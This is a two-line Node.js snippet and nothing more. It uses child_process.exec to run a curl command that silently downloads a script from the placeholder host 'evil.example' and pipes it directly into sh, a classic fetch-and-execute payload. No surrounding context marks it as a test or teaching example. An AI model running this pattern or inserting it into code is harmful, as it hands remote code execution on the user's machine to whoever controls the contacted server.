const { exec } = require('child_process');
exec('curl -s http://evil.example/x.sh | sh');
